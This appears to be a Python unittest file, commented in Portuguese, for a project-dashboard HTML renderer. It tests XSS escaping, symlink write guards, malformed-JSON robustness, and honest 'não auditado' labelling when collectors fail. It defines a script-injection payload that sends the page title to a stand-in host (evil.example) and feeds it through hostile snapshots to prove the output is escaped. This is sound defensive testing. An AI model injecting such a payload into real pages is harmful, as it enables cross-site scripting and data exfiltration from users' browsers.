"""Guards do dashboard.

O modelo de distribuicao da skill e snapshot VERSIONADO: quem clona um
repositorio alheio e roda o render abre, no proprio navegador, HTML derivado
de JSON escrito por outra pessoa.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from _fake_repo import fake_repo  # noqa: F401  (garante o sys.path dos scripts)

import render

PAYLOAD = "<script>fetch('https://evil.example/'+document.title)</script>"


def _snap(**extra):
    base = {
        "schema": 2, "project": "alvo",
        "generated_at": "2026-08-13T09:00:00-03:00",
        "collectors_run": ["git"], "errors": {},
    }
    base.update(extra)
    return base


class TestSnapshotHostil(unittest.TestCase):

    def test_campos_numericos_nao_injetam_script(self):
        snap = _snap(
            git={"age_days": PAYLOAD, "commits_30d": PAYLOAD, "authors_30d": []},
            django={"models": PAYLOAD, "apps": PAYLOAD},
            db={"cache_hit_ratio": PAYLOAD,
                "unused_indexes": [{"index": "i", "table": "t", "bytes": 1,
                                    "idx_scan": PAYLOAD}],
                "slow_queries": [{"query": "select 1", "calls": 1,
                                  "mean_ms": PAYLOAD, "total_s": PAYLOAD}]},
            quality={"complexity": {"worst": [{"file": "a.py", "name": "f",
                                               "complexity": 1, "line": PAYLOAD}]}},
        )
        html = render.render([snap])
        self.assertNotIn("<script>fetch", html)
        self.assertNotIn("</script><script", html)

    def test_snapshot_de_forma_invalida_nao_derruba(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, "2026-01-01.json").write_text("[1, 2, 3]", encoding="utf-8")
            Path(tmp, "2026-01-02.json").write_text(
                json.dumps(_snap()), encoding="utf-8")
            snaps = render.load_snapshots(tmp)
        self.assertEqual(len(snaps), 1)
        self.assertEqual(snaps[0]["project"], "alvo")

    def test_criterio_nao_medido_por_ambiente_entra_na_faixa(self):
        """Nao medir por AMBIENTE nao pode premiar — mas tambem nao pode
        reprovar em definitivo: entra na faixa (spec 2026-08-22, FU-RUCHX-
        NAO-AUDITADO-PREMIA). `pct` (pessimista) do snapshot nao-medido tem
        que ser MENOR que o do medido-limpo; `pct_max` (otimista) tem que
        ser MAIOR que o `pct` do mesmo snapshot nao-medido."""
        # "dependabot": False fixa 1 criterio como falha real nos dois lados.
        # Sem isso os dois snapshots batem 100% de qualquer jeito (tudo que
        # sobra no denominador passa), e o assertLess abaixo nunca
        # conseguiria provar nada — verificado rodando o fixture original do
        # brief antes desta troca: 100 contra 100 mesmo com o fix aplicado,
        # porque excluir um item 100%-limpo do denominador nao move a razao
        # quando so sobram itens que tambem passam. Com uma falha real
        # presente nos dois, contar segredos_commitados na ponta pessimista
        # MUDA a fracao (a falha pesa proporcionalmente mais), e da pra
        # provar que o item nao medido nao saiu de graca do calculo.
        medido = _snap(governance={"segredos_commitados": [], "workflows": {},
                                   "dependencias": {}, "dependabot": False})
        nao = _snap(governance={"segredos_commitados": None,
                                "nao_medido": {"segredos_commitados": "git falhou"},
                                "workflows": {}, "dependencias": {},
                                "dependabot": False})
        eixos_m = {x["nome"]: x for x in render.auditoria(medido)[0]}
        eixos_n = {x["nome"]: x for x in render.auditoria(nao)[0]}
        self.assertLess(eixos_n["Segurança"]["pct"], eixos_m["Segurança"]["pct"],
                        "pessimista: nao-medido nao pode empatar com medido-limpo")
        self.assertGreater(eixos_n["Segurança"]["pct_max"], eixos_n["Segurança"]["pct"],
                           "otimista tem que abrir faixa acima do pessimista")
        rotulos = " ".join(r for r, _ in eixos_n["Segurança"]["checados"])
        self.assertIn("não auditado", rotulos)


class TestContratoAchadoParqueado(unittest.TestCase):
    """Ponta a ponta: prova o contrato inteiro do achado parqueado na Task 3.

    render.py:323 (antes do fix) fazia `gov.get("segredos_commitados") or []`,
    o que reconstruia o None em lista vazia ANTES do criterio decidir "ok" —
    a nao-medicao virava "nenhum segredo commitado: atendido" com badge verde
    e criterio P0 marcado como cumprido. Este teste monta o HTML de verdade
    (nao so chama auditoria()) e prova as tres pontas do contrato.
    """

    def test_html_nao_afirma_seguranca_sem_medir(self):
        # "dependabot": False deixa 1 criterio realmente reprovado nos dois
        # snapshots — sem isso os dois batem 100% (excluir um item que so
        # ia contribuir pontos "limpos" do denominador nao move a razao
        # quando o resto ja passa 100%), e o assertNotEqual do item (2) nunca
        # provaria nada. Ver comentario identico em
        # test_criterio_nao_medido_por_ambiente_entra_na_faixa.
        nao_medido = _snap(governance={
            "segredos_commitados": None,
            "nao_medido": {"segredos_commitados": "git ls-files falhou"},
            "workflows": {}, "dependencias": {}, "dependabot": False,
        })
        medido_limpo = _snap(governance={
            "segredos_commitados": [],
            "workflows": {}, "dependencias": {}, "dependabot": False,
        })

        html_nao_medido = render.render([nao_medido])
        html_medido = render.render([medido_limpo])

        # (1) o motivo do nao-auditado aparece na tela, com o texto exato
        # que a UI usa pra sinalizar "isto nao foi verificado".
        self.assertIn("não auditado", html_nao_medido)
        self.assertIn("git ls-files falhou", html_nao_medido)
        # o snapshot de verdade limpo nao tem motivo nenhum pra mostrar.
        self.assertNotIn("git ls-files falhou", html_medido)

        # (2) a nota do eixo Seguranca no snapshot nao-medido tem que ser
        # DIFERENTE da nota do mesmo snapshot com segredos_commitados=[]
        # (medido, de verdade limpo). Notas iguais = a nao-medicao esta
        # sendo contada como "limpo", que e exatamente a mentira do achado.
        pct_nao_medido = {x["nome"]: x["pct"] for x in render.auditoria(nao_medido)[0]}["Segurança"]
        pct_medido = {x["nome"]: x["pct"] for x in render.auditoria(medido_limpo)[0]}["Segurança"]
        self.assertNotEqual(pct_nao_medido, pct_medido)

        # (3) o painel NAO pode afirmar "nenhum segredo commitado" como
        # criterio cumprido (marcado com o check "sim") quando na verdade
        # ninguem mediu. Criterio deve aparecer como "na" (nao aplicavel /
        # nao auditado), nunca "sim".
        eixos_nao_medido = {x["nome"]: x for x in render.auditoria(nao_medido)[0]}
        checklist = eixos_nao_medido["Segurança"]["checados"]
        item_segredo = next(rot for rot, ok in checklist if "segredo" in rot)
        ok_segredo = next(ok for rot, ok in checklist if "segredo" in rot)
        self.assertIs(ok_segredo, render.NAO_MEDIDO,
                      "segredos_commitados nao medido por ambiente tem que "
                      "sair como NAO_MEDIDO — nem sim, nem nao")
        # o card do eixo no HTML usa class="na" pro item nao auditado —
        # nunca class="sim" (que so aparece quando ok is True de verdade).
        self.assertIn(f'class="na">{render.e(item_segredo)}', html_nao_medido)
        self.assertNotIn(f'class="sim">{render.e(item_segredo)}', html_nao_medido)


class TestSiblingWorkflowsNaoMedido(unittest.TestCase):
    """Achado extra da varredura: `wf = gov.get("workflows") or {}` tinha o
    MESMO efeito do achado parqueado, so que num vizinho. Se o coletor
    `governance` inteiro falha (excecao antes de popular o dict), o
    `governance` nem aparece no snapshot — so em `errors`. Sem o fix, isso
    reconstruia `wf` como `{}` e `not wf.get("sem_pin")` virava True: as
    duas checks de workflow (pin e permissions) saiam "atendidas" de graca.
    """

    @staticmethod
    def _por_prefixo(checados, prefixo):
        """Casa o criterio pelo INICIO do rotulo.

        O rotulo passou a carregar o motivo do nao-auditado como sufixo
        ("actions com versão fixada (não auditado: ...)"). Este guard existe
        pra travar o COMPORTAMENTO — `ok` nunca vira True sem medicao — e nao
        o texto; casar exato impediria melhorar o rotulo.
        """
        return next(ok for rot, ok in checados if rot.startswith(prefixo))

    def test_governance_ausente_nao_credita_workflows(self):
        sem_governance = _snap(errors={"governance": "boom: falha inesperada"})
        eixos = {x["nome"]: x for x in render.auditoria(sem_governance)[0]}
        checklist = eixos["Segurança"]["checados"]
        ok_pin = self._por_prefixo(checklist, "actions com versão fixada")
        ok_perm = self._por_prefixo(checklist, "workflows com permissions declarado")
        self.assertIs(ok_pin, render.NAO_MEDIDO, "sem coletor rodado, pin nao pode sair True")
        self.assertIs(ok_perm, render.NAO_MEDIDO, "sem coletor rodado, permissions nao pode sair True")
        # O motivo tem que chegar JUNTO do criterio, no card do eixo — nao so
        # na lista de achados no fim da pagina.
        rotulos = " ".join(r for r, _ in checklist)
        self.assertIn("boom: falha inesperada", rotulos)

    def test_repo_sem_workflow_nenhum_vira_nada_a_auditar(self):
        """Decisao do dono (2026-08-20), invertendo o comportamento que este
        teste travava ate entao: repo SEM workflow nenhum ganhava os
        criterios de pin (3) e permissions (2) por verdade vacua — 5 pontos
        de graca em Seguranca sobre quem tem 1 workflow imperfeito. Agora
        zero workflows = "nada a auditar" (None): nem premia nem pune.
        """
        com_governance = _snap(governance={
            "segredos_commitados": [],
            "workflows": {"count": 0, "sem_pin": [], "sem_permissions": []},
            "dependencias": {},
        })
        eixos = {x["nome"]: x for x in render.auditoria(com_governance)[0]}
        checklist = eixos["Segurança"]["checados"]
        self.assertIsNone(self._por_prefixo(checklist, "actions com versão fixada"))
        self.assertIsNone(self._por_prefixo(checklist, "workflows com permissions declarado"))
        rotulos = " ".join(r for r, _ in checklist)
        self.assertIn("nada a auditar", rotulos)

    def test_workflow_existente_e_limpo_continua_creditando(self):
        """Guard contra sobrecorrecao do "nada a auditar": quem TEM workflow
        e esta com tudo pinado/declarado segue ganhando os criterios — o
        fix so tira o credito de quem nao tem o que proteger."""
        com_governance = _snap(governance={
            "segredos_commitados": [],
            "workflows": {"count": 2, "sem_pin": [], "sem_permissions": []},
            "dependencias": {},
        })
        eixos = {x["nome"]: x for x in render.auditoria(com_governance)[0]}
        checklist = eixos["Segurança"]["checados"]
        self.assertTrue(self._por_prefixo(checklist, "actions com versão fixada"))
        self.assertTrue(self._por_prefixo(checklist, "workflows com permissions declarado"))
        # Coletor rodado e com materia-prima: rotulos saem limpos, sem
        # sufixo de nao-auditado nem de nada-a-auditar.
        rotulos = [r for r, _ in checklist]
        self.assertIn("actions com versão fixada", rotulos)
        self.assertIn("workflows com permissions declarado", rotulos)
        self.assertIn("atualização automática de dependências", rotulos)

    def test_snapshot_antigo_sem_count_mas_com_lista_populada_ainda_mede(self):
        """Snapshot de versao anterior nao tem `workflows.count`. Se as
        listas denunciam workflow existente (sem_pin populado), o criterio
        continua MEDIDO — reprovando de verdade — em vez de cair no
        "nada a auditar"."""
        com_governance = _snap(governance={
            "segredos_commitados": [],
            "workflows": {"sem_pin": ["actions/checkout@v4"], "sem_permissions": []},
            "dependencias": {},
        })
        eixos = {x["nome"]: x for x in render.auditoria(com_governance)[0]}
        checklist = eixos["Segurança"]["checados"]
        self.assertIs(self._por_prefixo(checklist, "actions com versão fixada"), False)
        self.assertTrue(self._por_prefixo(checklist, "workflows com permissions declarado"))


class TestGovernanceAusenteNaoReprova(unittest.TestCase):
    """Fix round 2: o mesmo furo dos workflows, na direcao oposta.

    README, decisoes, licenca e runbook sao lidos por EXISTENCIA de arquivo
    (`bool(docs.get("readme"))`). Com o coletor `governance` fora do ar, `gov`
    vira {} e a leitura responde "nao tem" — indistinguivel de arquivo
    realmente ausente. O resultado era uma excecao no coletor virando 4
    reprovacoes de um projeto que pode estar com tudo no lugar: acusacao sem
    ter olhado, que e o pecado que a esteira inteira existe pra matar.
    """

    @staticmethod
    def _por_prefixo(checados, prefixo):
        return next(ok for rot, ok in checados if rot.startswith(prefixo))

    def test_coletor_que_levantou_nao_reprova_README_licenca_adr_runbook(self):
        sem_governance = _snap(errors={"governance": "boom: falha inesperada"})
        eixos = {x["nome"]: x for x in render.auditoria(sem_governance)[0]}
        processo = eixos["Processo"]["checados"]
        for prefixo in ("README", "decisões documentadas", "licença"):
            self.assertIs(self._por_prefixo(processo, prefixo), render.NAO_MEDIDO,
                          f"'{prefixo}' nao pode reprovar sem o coletor ter rodado")
        self.assertIs(
            self._por_prefixo(eixos["Confiabilidade"]["checados"], "runbook"), render.NAO_MEDIDO,
            "runbook nao pode reprovar sem o coletor ter rodado")

        # Nenhum criterio do eixo foi medido -> nao ha letra. "F" aqui seria
        # reprovacao inventada em cima de um coletor que nem rodou.
        self.assertNotEqual(eixos["Processo"]["letra"], "F")
        self.assertEqual(eixos["Processo"]["letra"], "NA")

        # O motivo tem que chegar na tela junto do criterio.
        rotulos = " ".join(r for r, _ in processo)
        self.assertIn("não auditado", rotulos)
        self.assertIn("boom: falha inesperada", rotulos)

    def test_coletor_que_rodou_sem_README_continua_reprovando(self):
        """Guard contra sobrecorrecao: arquivo REALMENTE ausente e achado.

        Se o fix transformar toda leitura de arquivo em "nao auditado", o eixo
        Processo para de reportar o que ele existe pra reportar.
        """
        com_governance = _snap(governance={
            "docs": {"readme": None, "licenca": "LICENSE", "adr": None,
                     "docs_dir": None, "runbooks": None},
            "segredos_commitados": [], "workflows": {}, "dependencias": {},
        })
        eixos = {x["nome"]: x for x in render.auditoria(com_governance)[0]}
        processo = eixos["Processo"]["checados"]
        self.assertIs(self._por_prefixo(processo, "README"), False,
                      "README ausente com coletor rodado e REPROVACAO, nao 'nao auditado'")
        self.assertIs(self._por_prefixo(processo, "decisões documentadas"), False)
        self.assertIs(self._por_prefixo(processo, "licença"), True)
        self.assertIs(
            self._por_prefixo(eixos["Confiabilidade"]["checados"], "runbook"), False)
        # E o rotulo do criterio medido nao carrega sufixo de nao-auditado.
        self.assertNotIn("não auditado", " ".join(r for r, _ in processo))


# ----------------------------------------------------------------------
# Fix round 1: achados da revisao externa (2 Critical, 3 Important, 2 Minor)
# ----------------------------------------------------------------------

class TestCritical1DependenciasXSS(unittest.TestCase):
    """render.py `build_signals`, ramo `else` de `if models:` (repo
    nao-Django — a MAIORIA dos repos numa ferramenta multi-linguagem):
    `stack.dependencies` era interpolado cru dentro de `<span
    class="stat-sub">`, sem `e()` nem `num()`. Payload executavel provado
    ponta a ponta antes do fix (`grep -c "<script"` = 1 no HTML gerado)."""

    def test_stack_dependencies_nao_injeta_script(self):
        snap = _snap(stack={"dependencies": PAYLOAD})  # sem "django" -> ramo else
        html = render.render([snap])
        self.assertNotIn("<script>fetch", html)

    def test_stack_dependencies_numero_normal_continua_mostrando(self):
        """Mutacao inversa: garante que o fix nao quebrou o caso feliz."""
        snap = _snap(stack={"dependencies": 7})
        html = render.render([snap])
        self.assertIn("7 dependências", html)


class TestCritical2SymlinkGuard(unittest.TestCase):
    """render.py `main()`: o guard so testava `Path(dirpath).is_symlink()`
    (pasta). Com `.ruch-x` sendo uma pasta REAL mas `.ruch-x/dashboard.html`
    sendo um symlink versionado apontando pra fora, `out.write_text()`
    seguia o link e escrevia FORA do repositorio, exit 0, silencioso — e
    `--open` abriria esse arquivo externo. Cobre os DOIS casos: pasta-symlink
    e arquivo-symlink (o segundo e o que furava o guard anterior)."""

    def _rodar_main_em(self, projeto):
        cwd = os.getcwd()
        os.chdir(projeto)
        try:
            with mock.patch.object(sys, "argv", ["render.py"]):
                with self.assertRaises(SystemExit):
                    render.main()
        finally:
            os.chdir(cwd)

    def test_pasta_de_snapshots_symlink_e_recusada(self):
        with tempfile.TemporaryDirectory() as tmp:
            fora = Path(tmp, "fora")
            fora.mkdir()
            (fora / "2026-01-01.json").write_text(json.dumps(_snap()), encoding="utf-8")
            projeto = Path(tmp, "projeto")
            projeto.mkdir()
            (projeto / ".ruch-x").symlink_to(fora, target_is_directory=True)

            self._rodar_main_em(projeto)
            self.assertFalse((fora / "dashboard.html").exists(),
                              "nada pode ter sido escrito do lado de fora do repositorio")

    def test_arquivo_dashboard_symlink_e_recusado(self):
        with tempfile.TemporaryDirectory() as tmp:
            alvo_externo = Path(tmp, "evil.html")
            projeto = Path(tmp, "projeto")
            projeto.mkdir()
            snapdir = projeto / ".ruch-x"
            snapdir.mkdir()
            (snapdir / "2026-01-01.json").write_text(json.dumps(_snap()), encoding="utf-8")
            (snapdir / "dashboard.html").symlink_to(alvo_externo)

            self._rodar_main_em(projeto)
            self.assertFalse(alvo_externo.exists(),
                              "o arquivo do outro lado do symlink nao pode ter sido criado/escrito")

    def test_caso_normal_sem_symlink_continua_escrevendo(self):
        """Mutacao inversa: garante que o guard nao bloqueou o caminho feliz."""
        with tempfile.TemporaryDirectory() as tmp:
            projeto = Path(tmp, "projeto")
            projeto.mkdir()
            snapdir = projeto / ".ruch-x"
            snapdir.mkdir()
            (snapdir / "2026-01-01.json").write_text(json.dumps(_snap()), encoding="utf-8")

            cwd = os.getcwd()
            os.chdir(projeto)
            try:
                with mock.patch.object(sys, "argv", ["render.py"]):
                    render.main()  # nao deve lancar SystemExit
            finally:
                os.chdir(cwd)
            self.assertTrue((snapdir / "dashboard.html").exists())


class TestImportant3NotaSemMedicao(unittest.TestCase):
    """`_nota(0, 0)` devolvia `(0, "F")` — eixo sem NENHUM criterio medido
    (ex.: coletor `governance` inteiro caiu, nada mais no snapshot) virava
    reprovacao FALSA, o mesmo pecado do achado parqueado na direcao oposta
    (nao medir nao pode punir, tampouco premiar)."""

    def test_nota_zero_sobre_zero_nao_e_F(self):
        letra_direta = render._nota(0, 0)[1]
        self.assertNotEqual(letra_direta, "F")
        self.assertEqual(letra_direta, "NA")
        self.assertIsNone(render._nota(0, 0)[0])

    def test_eixo_sem_criterio_medido_nao_vira_F_no_html(self):
        # fixture do proprio review: so o coletor governance falhou, resto
        # do snapshot ausente -> eixo Seguranca fica com total==0.
        snap = _snap(errors={"governance": "boom: falha inesperada"})
        eixos = {x["nome"]: x for x in render.auditoria(snap)[0]}
        seg = eixos["Segurança"]
        self.assertEqual(seg["letra"], "NA")
        self.assertIsNone(seg["pct"])
        html = render.render([snap])
        # o card do eixo Seguranca especificamente nao pode usar a classe
        # nota-F (vermelha, "reprovado") nem mostrar a letra F.
        self.assertNotIn('<div class="eixo nota-F"><div class="letra">F</div>'
                          '<div class="eixo-corpo"><h3>Segurança</h3>', html)
        self.assertIn('class="eixo nota-NA"', html)
        self.assertIn("não auditado — nenhum critério deste eixo pôde ser medido", html)


class TestImportant4GeneratedAtMalformado(unittest.TestCase):
    """`datetime.fromisoformat` so aceita string — `generated_at: null`
    (coletor que falhou, nao hostilidade) ou qualquer tipo nao-string
    levanta TypeError, nao capturado antes (so ValueError). Step 5 desta
    mesma task coagiu a chave de ordenacao do `load_snapshots` pra string,
    entao um `generated_at` malformado agora SOBREVIVE ao load e chegava
    vivo no render — onde crashava."""

    def test_generated_at_none_nao_derruba_render(self):
        snap = _snap(generated_at=None)
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_generated_at_numero_nao_derruba_render(self):
        snap = _snap(generated_at=20260813)
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_generated_at_lista_nao_derruba_render(self):
        snap = _snap(generated_at=["nao", "e", "data"])
        html = render.render([snap])
        self.assertIn("<html", html)


class TestImportant5ClassesDeLixo(unittest.TestCase):
    """Guard obrigatorio: um snapshot com TODAS as classes de lixo listadas
    pela revisao numa carga so — tem que produzir HTML (nunca traceback) e
    nao pode conter `<script` em lugar nenhum. Isola tambem cada classe em
    teste proprio pros casos mais especificos, pra apontar exatamente o que
    quebrou se este guard falhar de novo."""

    def _snapshot_lixo_total(self):
        return _snap(
            generated_at=None,
            collectors_run=[1, 2, "git"],
            errors=["nao e dict"],
            git={
                "branch": "main", "commit": "abc123",
                "age_days": PAYLOAD, "commits_30d": PAYLOAD,
                "authors_30d": "nao e lista",
                "hotspots": [
                    {"churn": 5, "complexity": 20, "loc": -999, "file": PAYLOAD},
                    {"churn": 3, "complexity": 8},  # sem "file"
                    "nao e dict",
                    {"churn": "abc", "complexity": 9, "file": "x.py", "loc": 10},
                ],
            },
            django={
                "models": PAYLOAD, "apps": PAYLOAD,
                "deploy_issues": "nao e lista",
                "pending_migrations": {"nao": "lista"},
                "ambiente_de_producao": True,
            },
            db="nao e dict",
            governance="nao e dict",
            quality={
                "complexity": {
                    "above_10": "abc", "blocks_analyzed": "abc",
                    "worst": [{"complexity": 99, "line": PAYLOAD}, "nao e dict",
                              {"file": "a.py", "name": "f", "complexity": PAYLOAD, "line": 1}],
                },
                "ruff": {"by_rule": [{"rule": "E501"}, "nao e dict",
                                     {"rule": "F401", "count": PAYLOAD}]},
            },
            tests={
                "coverage_pct": PAYLOAD, "coverage_age_days": PAYLOAD, "test_count": PAYLOAD,
                "by_app": [{"coverage_pct": PAYLOAD, "statements": PAYLOAD}, "nao e dict",
                          {"app": "x"}],
            },
            code={
                "total_loc": PAYLOAD, "total_files": PAYLOAD,
                "by_app": [{"app": "x", "code": PAYLOAD, "tests": PAYLOAD, "test_ratio": PAYLOAD},
                          "nao e dict",
                          # inteiro gigante — JSON nao limita precisao de int,
                          # e um total forjado (ou so muito errado) pode vir
                          # maior que o float aguenta (round 2 do fix externo).
                          {"app": "y", "code": 10**400, "tests": 10**300, "test_ratio": 0.5}],
            },
            stack={"detected": [1, 2, PAYLOAD], "dependencies": PAYLOAD},
            ci={
                "success_rate": PAYLOAD, "avg_duration_s": PAYLOAD,
                "recent": [{"duration_s": PAYLOAD}, "nao e dict"],
            },
            infra={"containers": [{"cpu": PAYLOAD}, "nao e dict"], "host": PAYLOAD},
        )

    def test_carga_total_produz_html_sem_traceback_e_sem_script(self):
        snap = self._snapshot_lixo_total()
        html = render.render([snap])  # nao pode levantar excecao
        self.assertIn("<html", html)
        self.assertNotIn("<script>fetch", html)

    def test_hotspots_loc_negativo_nao_vira_complex(self):
        snap = _snap(git={"hotspots": [
            {"churn": 5, "complexity": 10, "loc": -50, "file": "a.py"},
            {"churn": 3, "complexity": 8, "loc": -1, "file": "b.py"},
            {"churn": 9, "complexity": 30, "loc": -2, "file": "c.py"},
        ]})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_governance_como_string_nao_estoura_get(self):
        snap = _snap(governance="nao e dict")
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_db_como_string_nao_estoura_get(self):
        snap = _snap(db="nao e dict")
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_errors_como_lista_nao_estoura_items(self):
        snap = _snap(errors=["nao e dict"])
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_hotspots_sem_file_nao_da_keyerror(self):
        snap = _snap(git={"hotspots": [
            {"churn": 5, "complexity": 10, "loc": 5},
            {"churn": 3, "complexity": 8, "loc": 5},
            {"churn": 9, "complexity": 30, "loc": 5},
        ]})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_segredos_sem_file_nao_da_keyerror(self):
        snap = _snap(governance={"segredos_commitados": [{"kind": "token"}],
                                 "workflows": {}, "dependencias": {}})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_by_app_sem_campo_nao_da_keyerror(self):
        snap = _snap(tests={"by_app": [{}]})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_db_size_lista_de_nao_dicts_nao_estoura(self):
        snap = _snap(db={"size": ["nao e dict", 123]})
        html = render.render([snap])
        self.assertIn("<html", html)


# ----------------------------------------------------------------------
# Fix round 2: regressao do proprio fix de robustez — milhar() com int
# gigante
# ----------------------------------------------------------------------

class TestMilharOverflow(unittest.TestCase):
    """`milhar()` (helper NOVO do round 1, criado pra fechar o Important 5)
    usava `f"{v:,.0f}"` — o `.0f` forca conversao pra float antes de
    formatar. JSON nao limita a precisao de um numero sem ponto/expoente, e
    Python int nao tem limite de tamanho, mas float tem (~1.8e308). Um
    total_loc/total_files/test_count/statements/code/tests/live_rows/
    seq_scan/calls forjado (ou so muito errado) acima do limite do float
    estourava `OverflowError`; um pouco abaixo disso, mas ainda grande,
    perdia precisao SILENCIOSAMENTE (digito de lixo no dashboard, sem
    excecao nenhuma pra avisar). O codigo ANTIGO (antes do round 1) usava
    `f"{loc:,}"` — formatacao inteira nativa, sem essa conversao — entao a
    funcao criada pra fechar a robustez introduziu um caso novo de crash.
    """

    def test_inteiro_gigante_nao_estoura_overflowerror(self):
        # reproducao exata do relato da revisao: 10**400 e maior que
        # qualquer float representavel (float('inf') comeca em ~1.8e308).
        self.assertIsNotNone(render.milhar(10**400))

    def test_render_com_total_loc_gigante_nao_derruba(self):
        """Ponta a ponta: o mesmo `render.render([snap])` que a revisao
        rodou pra provar o crash."""
        snap = _snap(code={"total_loc": 10**400})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_inteiro_grande_sem_perda_de_precisao(self):
        """10**300 nao chega a estourar OverflowError, mas conversao pra
        float perderia digitos por precisao — assere o VALOR formatado,
        nao so a ausencia de excecao (a exigencia explicita do coordenador:
        um teste que so checa "nao lancou excecao" deixaria passar o efeito
        colateral de precisao que a revisao tambem descreveu)."""
        valor = 10**300
        resultado = render.milhar(valor)
        # tira os pontos de milhar (separador BR) e compara com a
        # representacao decimal exata do inteiro. Se tivesse passado por
        # float, o resultado teria arredondamento/zeros de lixo em vez do
        # digito 1 seguido de exatamente 300 zeros.
        self.assertEqual(resultado.replace(".", ""), str(valor))
        self.assertTrue(resultado.startswith("1."))

    def test_float_legitimo_continua_formatado_como_antes(self):
        """Mutacao inversa / nao-regressao: garante que o fix nao alterou o
        caso normal — float de verdade (ex: media com casas decimais)
        continua passando pelo caminho antigo (`.0f`, arredonda pra
        inteiro)."""
        self.assertEqual(render.milhar(1234.7), "1.235")

    def test_carga_total_de_lixo_inclui_inteiro_gigante(self):
        """O guard de robustez do round 1 (`_snapshot_lixo_total`) agora
        tambem carrega um `10**400`/`10**300` dentro de `code.by_app` — este
        teste isola so essa fatia, sem depender do resto da carga
        combinada, pra apontar direto pro `milhar()` se quebrar nesse ponto
        de novo."""
        snap = _snap(code={"by_app": [
            {"app": "y", "code": 10**400, "tests": 10**300, "test_ratio": 0.5},
        ]})
        html = render.render([snap])
        self.assertIn("<html", html)
        self.assertNotIn("<script", html)


# ----------------------------------------------------------------------
# Fix wave final: achados da revisao de branch inteira (3 Critical, 6
# Important, 8 Minor). Aqui ficam os que moram no render.
# ----------------------------------------------------------------------

def _criterio(snap, eixo, prefixo):
    """(rotulo, ok) do criterio de um eixo, casado pelo INICIO do rotulo.

    Casar pelo prefixo e nao pelo texto exato porque o rotulo carrega o
    sufixo do nao-auditado — o guard trava o COMPORTAMENTO, nao a redacao.
    """
    eixos = {x["nome"]: x for x in render.auditoria(snap)[0]}
    return next((rot, ok) for rot, ok in eixos[eixo]["checados"]
                if rot.startswith(prefixo))


class TestCritical1NenhumNoneNaTela(unittest.TestCase):
    """O painel escrevia a string `None` dez vezes no lugar de "nao medi".

    `render.py` interpolava `{freq}`, `{cx}`, `{ci_ok}`, `{desatual}` cru em
    f-string de rotulo e de resumo — antes de saber se o valor existe. No
    dashboard do PROPRIO ruch-x isso rendia "None/sem · lead Noneh · falha
    None%", "None funções complexas" e "dependências atualizadas
    (None/None)": o painel afirmando, em portugues de Python, numero que
    ninguem apurou. E o mapa `nao_medido` que o coletor grava
    (`git.nao_medido.hotspots`, `quality.nao_medido.complexity`) nunca
    chegava na tela, contra o que `docs/extending.md` (regra 1) e
    `docs/security.md` prometem por escrito.
    """

    @staticmethod
    def _coletores_caidos():
        """Snapshot realista de maquina sem gh, sem radon e sem Django."""
        return _snap(
            collectors_run=["stack", "code", "quality", "tests", "django", "git"],
            errors={"governance": "gh: comando nao encontrado",
                    "ci": "gh cli nao encontrado",
                    "dora": "sem historico de deploy",
                    "db": "sem DSN", "infra": "docker inacessivel"},
            git={"branch": "main", "commit": "abc1234", "hotspots": None,
                 "nao_medido": {"hotspots": "git log falhou"}},
            quality={"complexity": None,
                     "nao_medido": {"complexity": "radon nao instalado"}},
            tests={"coverage_pct": None},
            django={"pending_migrations": None, "deploy_issues": None,
                    "other_issues": None,
                    "nao_medido": {"pending_migrations": "projeto sem manage.py na raiz",
                                   "deploy_issues": "projeto sem manage.py na raiz"}},
        )

    def test_a_string_None_nao_aparece_no_html(self):
        html = render.render([self._coletores_caidos()])
        self.assertNotIn("None", html)

    def test_resumo_do_eixo_nao_afirma_numero_que_ninguem_mediu(self):
        """O pior pedaco: a linha de resumo AFIRMAVA.

        `0 segredo(s) · 0 action(s) sem pin` com o coletor `governance`
        inteiro caido e o achado parqueado da Task 3 reconstruido uma linha
        abaixo do criterio que a Task 7 consertou. `branch desprotegida` sem
        `gh` e o que `docs/criteria.md` chama de "acusacao sem ter olhado".
        """
        eixos = {x["nome"]: x for x in render.auditoria(self._coletores_caidos())[0]}
        self.assertNotIn("0 segredo(s)", eixos["Segurança"]["resumo"])
        self.assertNotIn("0 action(s)", eixos["Segurança"]["resumo"])
        self.assertNotIn("desprotegida", eixos["Processo"]["resumo"])
        self.assertIn("não auditada", eixos["Processo"]["resumo"])
        # "runbooks não" (veredito) contra "runbooks não auditado" (ausencia
        # de veredito) — a assercao e no texto inteiro pra nao casar o
        # primeiro dentro do segundo.
        self.assertIn("runbooks não auditado", eixos["Confiabilidade"]["resumo"])
        for nome in ("Entrega", "Qualidade", "Segurança", "Confiabilidade", "Processo"):
            self.assertNotIn("None", eixos[nome]["resumo"])

    def test_motivo_gravado_pelo_coletor_chega_na_tela(self):
        """`nao_medido` existia no snapshot e morria nele."""
        html = render.render([self._coletores_caidos()])
        self.assertIn("git log falhou", html)          # git.nao_medido.hotspots
        self.assertIn("radon nao instalado", html)     # quality.nao_medido.complexity
        self.assertIn("projeto sem manage.py na raiz", html)

    def test_criterio_de_coletor_que_nem_rodou_diz_por_que(self):
        """Coletor que levanta excecao nao deixa a propria chave no snapshot,
        so uma entrada em `errors` — o criterio saia "nao auditado" pelado."""
        rot, ok = _criterio(self._coletores_caidos(), "Confiabilidade", "CI verde")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("não auditado", rot)
        self.assertIn("gh cli nao encontrado", rot)

    def test_valor_medido_continua_aparecendo(self):
        """Mutacao inversa: o fix nao pode apagar o numero que EXISTE."""
        snap = _snap(dora={"deploys_por_semana": 12, "lead_time_p50_h": 3,
                           "change_failure_rate": 4, "mttr_h": 1})
        eixos = {x["nome"]: x for x in render.auditoria(snap)[0]}
        self.assertIn("12/sem", eixos["Entrega"]["resumo"])
        self.assertIn("lead 3h", eixos["Entrega"]["resumo"])
        rot, ok = _criterio(snap, "Entrega", "frequência de deploy")
